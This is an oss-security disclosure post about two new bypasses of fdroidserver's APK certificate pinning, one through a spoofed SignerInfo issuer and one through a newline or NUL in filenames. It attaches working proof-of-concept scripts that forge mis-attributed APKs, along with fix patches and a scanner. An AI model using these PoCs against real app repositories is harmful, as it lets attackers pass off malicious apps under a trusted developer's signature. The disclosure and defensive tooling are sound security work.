Received: (qmail 6105 invoked by uid 550); 3 Jan 2025 11:34:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 11501 invoked from network); 2 Jan 2025 16:54:32 -0000
Authentication-Results: ext-mx-out013.mykolab.com (amavis);
 dkim=pass (2048-bit key) reason="pass (just generated, assumed good)"
 header.d=kolabnow.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kolabnow.com; h=
	content-disposition:content-type:content-type:mime-version
	:message-id:subject:subject:from:from:date:date:received
	:received:received; s=dkim20240523; t=1735836860; x=1737651261;
	 bh=ILTGQpicTcJylKbKsjE+5iAso0LuUmGjYT+Cc1TRljg=; b=mViulzM5mBhA
	xEycXr3SYlxTlI0T9C4d+U6PLMPor+zJhpQO4omQ6p8O/WJ0QJisz7bLLEHBi1CP
	6h4EmqzW8zQxoUvUZd0as8fLDTggkSoWv4anEhVu9NyHpmCVp5KXxafZ3B8yI4ji
	AnSa6yf6/K9vEzrvN0b3S4OJm/VauC1HzZLWHA+kSAEmV65GZ14Xi6W90Yf445cW
	AGYbukeAUZnHtZjnM3kIA7pT+egXFaKtJ4wwdDFXnKg7ywoYObO0Yl8DnKM6R7BX
	tVUUCCeMIHZdYKh+Y1rLcZ4kFdS+2jCFxkhTjWq1Y3cNYxJA6LFx33N7mImO+B6N
	PAv8exdCyg==
X-Virus-Scanned: amavis at mykolab.com
Date: Thu, 2 Jan 2025 17:54:18 +0100
From: Fay Stegerman <flx@obfusk.net>
To: oss-security@lists.openwall.com
Message-ID: <Z3bEuhwZJuIYpTqg@nihonium>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="+oKPSosSbxCNzckQ"
Content-Disposition: inline
Subject: [oss-security] Another fdroidserver AllowedAPKSigningKeys certificate pinning bypass

--+oKPSosSbxCNzckQ
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi!

Another update for [1,2], still published at [3]: two more PoCs (bringing
the total to 5), patches for the 5th PoC, and an updated script to scan for
potentially affected APKs.  I've attached the new and updated files and
included the new sections from the README with the updates below.

- Fay

[1] https://www.openwall.com/lists/oss-security/2024/04/08/8
[2] https://www.openwall.com/lists/oss-security/2024/04/20/3
[3] https://github.com/obfusk/fdroid-fakesigner-poc

============================================================================

# F-Droid Fake Signer PoC

PoC for fdroidserver AllowedAPKSigningKeys certificate pinning bypass.

Published: 2024-04-08; updated: 2024-04-14, 2024-04-20, 2024-12-30.

[...]

### [Observations] Update (2024-12-30 #1)

Instead of adopting the fixes we proposed, F-Droid wrote and merged their
own patch [10], ignoring repeated warnings it had significant flaws
(including an incorrect implementation of v1 signature verification and
making it impossible to have APKs with rotated keys in a repository).  As a
result it is possible to construct a valid v1 signature that fdroidserver
matches to the wrong certificate.

We do this by simply creating and prepending a second SignerInfo using our
own certificate, which has the same serial number and an almost identical
issuer -- e.g. a common name with a space (0x20) replaced by a tab (0x09) or
a DEL (0x7f) appended -- to exploit an implementation that will match the
SignerInfo against the wrong certificate through incorrect canonicalisation.

Luckily, the impact is lower than that of the other vulnerabilities as it
does require a valid signature from the certificate one wishes to spoof.

### [Observations] Update (2024-12-30 #2)

Unfortunately, we found another more severe vulnerability as well, caused by
a regex incorrectly handling newlines in filenames.  This allows another
trivial bypass of certificate pinning, as we can once again make
fdroidserver see whatever certificate we want instead of the one
Android/apksigner does (as long as we have a valid v1 signature for some
other APK).

The regex in question -- ^META-INF/.*\.(DSA|EC|RSA)$ -- is supposed to match
all filenames that start with META-INF/ and end with .DSA, .EC, or .RSA.
Unfortunately, the ".*" does not match newlines, and the "$" matches not
just the end of the string but "the end of the string or just before the
newline at the end of the string".  As a result we can use a newline in the
filename of the real signature files (before the extension), which
Android/apksigner see but fdroidserver does not, and a newline after the
.RSA extension for the spoofed signature files, which fdroidserver will see
but Android/apksigner will not.

NB: androguard seems to use a similarly incorrect regex.

We can do almost the exact same thing with NUL bytes instead of newlines,
independently of the flawed regex, because Python's ZipInfo.filename is
sanitised by removing any NUL byte and everything after it.  This will have
the same result for fdroidserver and apksigner (which happily accepts NUL
bytes in filenames) as above, but luckily Android rejects APKs with NUL
bytes in filenames, and such an APK will thus fail to install.

NB: in light of all of the above we reiterate that we strongly recommend
using the official apksig library (used by apksigner) to both verify APK
signatures and return the first signer's certificate to avoid these kind of
implementation mistakes and inconsistencies and thus further
vulnerabilities.  Handling common cases correctly is fairly easy, but
handling edge cases correctly is hard; rolling your own implementation
without the required expertise and care to get it right is irresponsible.

[...]

### [PoC] Update (2024-12-30 #1)

NB: for convenience we generate our own key for the spoofed certificate as
well; for a real exploit we'd have a v1-signed APK to use here instead of
signing one ourselves.

```bash
$ ./make-key-v4.sh          # generates a dummy key
$ sha256sum cert-rsa-fake.der cert-rsa-orig.der
29c6fc6cfa20c2726721944a659a4293c5ac7e8090ab5faa8e26f64ba007bea4  cert-rsa-fake.der
1e8a45fa677f82755b63edee209fee92081ba822d4f425c3792a1980bfa3fca9  cert-rsa-orig.der
$ python3 make-poc-v4.py    # uses app3.apk (needs minSdk >= 24 & targetSdk < 30)
$ python3 fdroid.py         # verifies and has the wrong signer according to F-Droid
True
ERROR:root:"Signature is invalid", skipping:
  1e8a45fa677f82755b63edee209fee92081ba822d4f425c3792a1980bfa3fca9
  Common Name: Foo Bar
1e8a45fa677f82755b63edee209fee92081ba822d4f425c3792a1980bfa3fca9
$ apksigner verify -v --print-certs poc.apk | grep -E '^Verified using|Signer #1 certificate (DN|SHA-256)'
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
Verified using v4 scheme (APK Signature Scheme v4): false
Signer #1 certificate DN: CN=Foo        Bar
Signer #1 certificate SHA-256 digest: 29c6fc6cfa20c2726721944a659a4293c5ac7e8090ab5faa8e26f64ba007bea4
```

### [PoC] Update (2024-12-30 #2)

NB: version A uses newlines, version B NUL bytes (which makes it fail to
actually install on Android devices despite verifying with apksigner).

```bash
$ python3 make-poc-v5a.py   # uses app3.apk (needs targetSdk < 30) as base, adds fake.apk .RSA
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
```

```bash
$ python3 make-poc-v5b.py   # uses app3.apk (needs targetSdk < 30) as base, adds fake.apk .RSA
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
```

[...]

### [Patch] Update (2024-12-30)

The fdroidserver-regex.patch fixes the regex to correctly handle newlines.

The fdroidserver-null-v1.patch (for fdroidserver before the changes we
recommended against) and fdroidserver-null-v2.patch (for current
fdroidserver) use ZipInfo.orig_filename to handle NUL bytes properly (and
avoid other potential issues).

[...]

### [Scanner] Update (2024-12-30)

The scan.py script has been updated to check for APK Signature Scheme v3.1
blocks (which will likely give false positives needing manual inspection as
those are expected to differ with key rotation) as well as NUL/LF/CR in
filenames and to use ZipInfo.orig_filename.

NB: currently, neither fdroidserver nor androguard will see APK Signature
Scheme v3.1 blocks.

```bash
$ python3 scan.py poc[45]*.apk
'poc4.apk': Multiple certificates in signature block file
'poc5a.apk': NUL, LF, or CR in filename
'poc5b.apk': NUL, LF, or CR in filename
```

## References

[...]

* [10] https://gitlab.com/fdroid/fdroidserver/-/merge_requests/1466

[...]

--+oKPSosSbxCNzckQ
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="fdroidserver-null-v1.patch"

diff --git a/fdroidserver/common.py b/fdroidserver/common.py
index e02d63c1..eb9ae1a1 100644
--- a/fdroidserver/common.py
+++ b/fdroidserver/common.py
@@ -3171,12 +3171,12 @@ def get_first_signer_certificate(apkpath):
 
     if not cert_encoded:
         with zipfile.ZipFile(apkpath, 'r') as apk:
-            cert_files = [n for n in apk.namelist() if SIGNATURE_BLOCK_FILE_REGEX.match(n)]
-            if len(cert_files) > 1:
+            cert_infos = [i for i in apk.infolist() if SIGNATURE_BLOCK_FILE_REGEX.match(i.orig_filename)]
+            if len(cert_infos) > 1:
                 logging.error(_("Found multiple JAR Signature Block Files in {path}").format(path=apkpath))
                 return None
-            elif len(cert_files) == 1:
-                cert_encoded = get_certificate(apk.read(cert_files[0]))
+            elif len(cert_infos) == 1:
+                cert_encoded = get_certificate(apk.read(cert_infos[0]))
 
     if not cert_encoded:
         logging.error(_("No signing certificates found in {path}").format(path=apkpath))

--+oKPSosSbxCNzckQ
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="fdroidserver-null-v2.patch"

diff --git a/fdroidserver/common.py b/fdroidserver/common.py
index 5f812206..699e03d4 100644
--- a/fdroidserver/common.py
+++ b/fdroidserver/common.py
@@ -3272,24 +3272,36 @@ def get_first_signer_certificate(apkpath):
         not (certs_v3 or certs_v2) and get_effective_target_sdk_version(apkobject) < 30
     ):
         with zipfile.ZipFile(apkpath, 'r') as apk:
-            cert_files = [
-                n for n in apk.namelist() if SIGNATURE_BLOCK_FILE_REGEX.match(n)
+            cert_infos = [
+                i for i in apk.infolist() if SIGNATURE_BLOCK_FILE_REGEX.match(i.orig_filename)
             ]
-            if len(cert_files) > 1:
+            if len(cert_infos) > 1:
                 logging.error(
                     _("Found multiple JAR Signature Block Files in {path}").format(
                         path=apkpath
                     )
                 )
                 return
-            elif len(cert_files) == 1:
-                signature_block_file = cert_files[0]
+            elif len(cert_infos) == 1:
+                signature_block_info = cert_infos[0]
+                signature_block_file = cert_infos[0].orig_filename
                 signature_file = (
-                    cert_files[0][: signature_block_file.rindex('.')] + '.SF'
+                    signature_block_file[: signature_block_file.rindex('.')] + '.SF'
                 )
+                for info in apk.infolist():
+                    if info.orig_filename == signature_file:
+                        signature_info = info
+                        break
+                else:
+                    logging.error(
+                        _("Missing JAR Signature File in {path}").format(
+                            path=apkpath
+                        )
+                    )
+                    return
                 cert_v1 = get_certificate(
-                    apk.read(signature_block_file),
-                    apk.read(signature_file),
+                    apk.read(signature_block_info),
+                    apk.read(signature_info),
                 )
                 found_certs.append(cert_v1)
                 if not cert_encoded:

--+oKPSosSbxCNzckQ
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="fdroidserver-regex.patch"

diff --git a/fdroidserver/common.py b/fdroidserver/common.py
index 66dd106e..8de2f289 100644
--- a/fdroidserver/common.py
+++ b/fdroidserver/common.py
@@ -93,7 +93,7 @@ MINIMUM_APKSIGNER_BUILD_TOOLS_VERSION = '30.0.0'
 VERCODE_OPERATION_RE = re.compile(r'^([ 0-9/*+-]|%c)+$')
 
 # A signature block file with a .DSA, .RSA, or .EC extension
-SIGNATURE_BLOCK_FILE_REGEX = re.compile(r'^META-INF/.*\.(DSA|EC|RSA)$')
+SIGNATURE_BLOCK_FILE_REGEX = re.compile(r'\AMETA-INF/(?s:.)*\.(DSA|EC|RSA)\Z')
 APK_NAME_REGEX = re.compile(r'^([a-zA-Z][\w.]*)_(-?[0-9]+)_?([0-9a-f]{7})?\.apk')
 APK_ID_TRIPLET_REGEX = re.compile(r"^package: name='(\w[^']*)' versionCode='([^']+)' versionName='([^']*)'")
 STANDARD_FILE_NAME_REGEX = re.compile(r'^(\w[\w.]*)_(-?[0-9]+)\.\w+')

--+oKPSosSbxCNzckQ
Content-Type: application/x-sh
Content-Disposition: attachment; filename="make-key-v4.sh"
Content-Transfer-Encoding: quoted-printable

#!/bin/bash=0A=
openssl req -x509 -newkey rsa:2048 -sha512 -outform DER -out cert-rsa-orig.=
der -days 10000 -nodes -subj '/CN=3DFoo Bar' -set_serial 1279905024 -keyout=
 - | openssl pkcs8 -topk8 -nocrypt -outform DER -out privkey-rsa-orig.der=
=0A=
openssl req -x509 -newkey rsa:2048 -sha512 -outform DER -out cert-rsa-fake.=
der -days 10000 -nodes -subj $'/CN=3DFoo\tBar' -set_serial 1279905024 -keyo=
ut - | openssl pkcs8 -topk8 -nocrypt -outform DER -out privkey-rsa-fake.der=
=0A=

--+oKPSosSbxCNzckQ
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v4.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool
import pyasn1.codec.cer.encoder as cer_encoder
import zipfile

from apksigtool import (                                        # type: ignore[attr-defined]
    JARSignatureFile, PrivKey, ECDSA, PKCS1v15, Halgo, PRIVKEY_TYPE,
    JAR_HASHERS_STR, DIGEST_ENCRYPTION_ALGORITHM, pyasn1_decode, pyasn1_encode,
    pyasn1_univ, rfc2315, create_signature, do_sign)
from typing import Optional, Tuple


# patched copy that doesn't sort setOf so we can reliably insert the fake cert
def encodeValue(self, value, asn1Spec, encodeFun, **options):   # type: ignore
    chunks = self._encodeComponents(
        value, asn1Spec, encodeFun, **options)
    return cer_encoder.null.join(chunks), True, True            # type: ignore


# patched copy that doesn't raise, just warns
def _assert(b: bool, what: Optional[str] = None) -> None:
    if not b:
        print("Assertion failed" + (f": {what}" if what else ""))


# patched copy that adds the fake cert
def _create_signature_block_file(sf: JARSignatureFile, *, cert: bytes, key: PrivKey,
                                 hash_algo: str) -> Tuple[bytes, str]:
    def halgo_f() -> Halgo:
        return ECDSA(halgo()) if alg == "EC" else halgo()       # type: ignore
    alg, = [e for c, e in PRIVKEY_TYPE.items() if isinstance(key, c)]
    oid, _, halgo = JAR_HASHERS_STR[hash_algo]
    dea = DIGEST_ENCRYPTION_ALGORITHM[alg][hash_algo]
    pad = PKCS1v15 if alg == "RSA" else None
    crt = pyasn1_decode(cert, asn1Spec=rfc2315.Certificate())[0]
    sig = create_signature(key, sf.raw_data, halgo_f, pad)
    sdat = rfc2315.SignedData()
    sdat["version"] = 1
    sdat["digestAlgorithms"][0]["algorithm"] = oid
    sdat["contentInfo"] = rfc2315.ContentInfo()
    sdat["contentInfo"]["contentType"] = rfc2315.ContentType(rfc2315.data)
    # --- BEGIN PATCH ---
    print("prepending orig cert (with modified signer info)...")
    sdat["certificates"][0]["certificate"] = orig_crt
    sdat["certificates"][1]["certificate"] = crt
    orig_sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sdat["signerInfos"][0] = orig_sinf
    sinf = sdat["signerInfos"][1]
    # --- END PATCH ---
    sinf["version"] = 1
    sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sinf["issuerAndSerialNumber"]["serialNumber"] = crt["tbsCertificate"]["serialNumber"]
    sinf["digestAlgorithm"]["algorithm"] = oid
    sinf["digestEncryptionAlgorithm"]["algorithm"] = dea
    sinf["encryptedDigest"] = sig
    cinf = rfc2315.ContentInfo()
    cinf["contentType"] = rfc2315.ContentType(rfc2315.signedData)
    cinf["content"] = pyasn1_univ.Any(pyasn1_encode(sdat))
    return pyasn1_encode(cinf), alg


# for a real exploit we'd have a v1-signed APK to use here instead of signing ourselves
# must have minSdk >= 24 & targetSdk < 30
apksigcopier.copy_apk("app3.apk", "poc-unsigned.apk", exclude=apksigcopier.exclude_meta)
do_sign("poc-unsigned.apk", "poc-signed-orig.apk", cert="cert-rsa-orig.der",
        key="privkey-rsa-orig.der", no_v2=True, no_v3=True)

with zipfile.ZipFile("poc-signed-orig.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(f"Getting cert from {info.filename!r}...")
            data = zf.read(info.filename)
            cinf = pyasn1_decode(data, asn1Spec=rfc2315.ContentInfo())[0]
            sdat = pyasn1_decode(cinf["content"], asn1Spec=rfc2315.SignedData())[0]
            orig_sinf = sdat["signerInfos"][0]
            orig_crt = sdat["certificates"][0]["certificate"]
            break

cer_encoder.SetOfEncoder.encodeValue = encodeValue              # type: ignore
apksigtool._assert = _assert
apksigtool._create_signature_block_file = _create_signature_block_file

do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa-fake.der",
        key="privkey-rsa-fake.der", no_v2=True, no_v3=True)

--+oKPSosSbxCNzckQ
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v5a.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool

from cryptography.hazmat.primitives import serialization


with open("cert-rsa.der", "rb") as fh:
    cert = fh.read()
with open("privkey-rsa.der", "rb") as fh:
    privkey = serialization.load_der_private_key(fh.read(), None)
    assert isinstance(privkey, apksigtool.PrivKeyTypes)

# must have targetSdk < 30
date_time = apksigcopier.copy_apk("app3.apk", "poc.apk", exclude=apksigcopier.exclude_meta)
meta = []

for info, data in apksigcopier.extract_meta("fake.apk"):
    if not info.filename.endswith(".MF"):
        if not info.filename.endswith(".SF"):
            info.filename += "\n"
        meta.append((info, data))

for info, data in apksigtool.create_v1_signature("poc.apk", cert=cert, key=privkey):
    if not info.filename.endswith(".MF"):
        info.filename = info.filename.replace("/", "/\n")
    meta.append((info, data))

apksigcopier.patch_meta(meta, "poc.apk", date_time=date_time)

--+oKPSosSbxCNzckQ
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v5b.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool

from cryptography.hazmat.primitives import serialization


with open("cert-rsa.der", "rb") as fh:
    cert = fh.read()
with open("privkey-rsa.der", "rb") as fh:
    privkey = serialization.load_der_private_key(fh.read(), None)
    assert isinstance(privkey, apksigtool.PrivKeyTypes)

# must have targetSdk < 30
date_time = apksigcopier.copy_apk("app3.apk", "poc.apk", exclude=apksigcopier.exclude_meta)
meta = []

for info, data in apksigcopier.extract_meta("fake.apk"):
    if not info.filename.endswith(".MF"):
        if not info.filename.endswith(".SF"):
            info.filename += "\x00"
        meta.append((info, data))

for info, data in apksigtool.create_v1_signature("poc.apk", cert=cert, key=privkey):
    if not info.filename.endswith(".MF"):
        info.filename = info.filename.replace("/", "/\x00")
    meta.append((info, data))

# NB: this APK will verify with apksigner but fail to install on Android devices
apksigcopier.patch_meta(meta, "poc.apk", date_time=date_time)

--+oKPSosSbxCNzckQ
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="scan.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import argparse
import hashlib
import logging
import sys
import zipfile

from pyasn1.codec.der.decoder import decode as pyasn1_decode
from pyasn1.codec.der.encoder import encode as pyasn1_encode
from pyasn1.error import PyAsn1Error
from pyasn1_modules import rfc2315                          # type: ignore[import-untyped]

from typing import Any, List, Optional, Tuple

try:
    from androguard.core import apk as ag_apk               # type: ignore[import-untyped]
except ImportError:
    from androguard.core.bytecodes import apk as ag_apk     # type: ignore[import-untyped]


class Err(Exception):
    pass


class Warn(Exception):
    pass


# NB: monkey patch of sorts
class HDict(dict):                                          # type: ignore[type-arg]
    def __init__(self) -> None:
        self.history: List[Tuple[Any, Any]] = []

    def __setitem__(self, k: Any, v: Any) -> None:
        self.history.append((k, v))
        super().__setitem__(k, v)

    # for androguard >= v4.1.2 which fixes duplicate block ID handling
    # but does not yet have an API to get all but the first
    def __contains__(self, k: Any) -> bool:
        return False


def wrangle_androguard(apk: str) -> Tuple[List[int], List[bytes], List[bytes], List[bytes]]:
    instance = ag_apk.APK(apk)
    assert getattr(instance, "_v2_blocks", None) == {}      # pylint: disable=C1803
    instance._v2_blocks = hdict = HDict()
    instance.parse_v2_v3_signature()
    block_ids = [k for k, v in hdict.history]
    instance = ag_apk.APK(apk)
    v3_certs = instance.get_certificates_der_v3()
    v2_certs = instance.get_certificates_der_v2()
    instance = ag_apk.APK(apk)
    assert instance._APK_SIG_KEY_V3_SIGNATURE == 0xf05368c0
    instance._APK_SIG_KEY_V3_SIGNATURE = 0x1b93ad61         # v3.1
    v31_certs = instance.get_certificates_der_v3()
    return block_ids, v2_certs, v3_certs, v31_certs


def check_apk_certs(apk: str) -> Optional[bytes]:
    block_ids, v2_certs, v3_certs, v31_certs = wrangle_androguard(apk)
    if len(block_ids) != len(set(block_ids)):
        raise Err("Duplicate block IDs")
    if len(v31_certs) > 1:
        raise Warn("Multiple v3.1 certificates")
    if len(v3_certs) > 1:
        raise Warn("Multiple v3 certificates")
    if len(v2_certs) > 1:
        raise Warn("Multiple v2 certificates")
    if not (v2_certs or v3_certs or v31_certs):
        return None
    if v31_certs and not v3_certs:
        raise Err("No v3 certs even though v3.1 cert is present")
    if v3_certs and v31_certs and v3_certs != v31_certs:
        raise Warn("Mismatch between v3 and v3.1 certificates (probably rotation)")
    if v2_certs and v3_certs and v2_certs != v3_certs:
        raise Warn("Mismatch between v2 and v3 certificates (possibly rotation)")
    result = v3_certs[0] if v3_certs else v2_certs[0]
    assert isinstance(result, bytes)
    return result


# FIXME: check for .RSA w/o .SF?
def check_jar_certs(apk: str) -> Optional[bytes]:
    signature_block_files = []
    with zipfile.ZipFile(apk, "r") as zf:
        for info in zf.infolist():
            if info.orig_filename.startswith("META-INF/"):
                if any(info.orig_filename.endswith(ext) for ext in (".DSA", ".EC", ".RSA")):
                    signature_block_files.append(zf.read(info))
            if any(c in info.orig_filename for c in "\x00\n\r"):
                raise Warn("NUL, LF, or CR in filename")
    if len(signature_block_files) > 1:
        raise Warn("Multiple signature block files")
    if not signature_block_files:
        return None
    certificates = []
    try:
        cinf = pyasn1_decode(signature_block_files[0], asn1Spec=rfc2315.ContentInfo())[0]
        if cinf["contentType"] != rfc2315.signedData:
            raise Err("Signature block file contentType is not signedData")
        sdat = pyasn1_decode(cinf["content"], asn1Spec=rfc2315.SignedData())[0]
        for cert in sdat["certificates"]:
            certificates.append(pyasn1_encode(cert))
    except PyAsn1Error as e:
        raise Err("Unable to parse signature block file data") from e
    if len(certificates) > 1:
        raise Warn("Multiple certificates in signature block file")
    if not certificates:
        raise Err("No certificates in signature block file")
    assert isinstance(certificates[0], bytes)
    return certificates[0]


# NB: this will flag some valid APKs too, e.g. those with certificate chains,
# rotation, or multiple signers
def check_apks(*apks: str, verbose: bool) -> bool:
    ok = True
    for apk in apks:
        if verbose:
            print(f"Checking {apk!r} ...")
        try:
            apk_cert = check_apk_certs(apk)
            jar_cert = check_jar_certs(apk)
            if apk_cert is None and jar_cert is None:
                raise Err("No certificates in APK")
            if apk_cert is not None and jar_cert is not None and apk_cert != jar_cert:
                raise Warn("Mismatch between v1 and v2/v3 certificates")
        except (Err, Warn) as e:
            ok = False
            if verbose:
                t = "Error" if isinstance(e, Err) else "Warning"
                print(f"  {t}: {e}", file=sys.stderr)
            else:
                print(f"{apk!r}: {e}", file=sys.stderr)
        else:
            if verbose:
                cert = apk_cert or jar_cert
                assert isinstance(cert, bytes)
                fingerprint = hashlib.sha256(cert).hexdigest()
                print(f"  OK {fingerprint}")
    return ok


def _nologging() -> None:
    # disable androguard warnings
    logging.getLogger().setLevel(logging.ERROR)
    try:
        from loguru import logger                           # type: ignore
        logger.remove()
    except ImportError:
        pass


if __name__ == "__main__":
    _nologging()
    parser = argparse.ArgumentParser(description="Check APKs for possible signature issues.")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("apks", metavar="APK", nargs="*", help="APK file(s) to check")
    args = parser.parse_args()
    if not check_apks(*args.apks, verbose=args.verbose):
        sys.exit(1)

# vim: set tw=80 sw=4 sts=4 et fdm=marker :

--+oKPSosSbxCNzckQ--
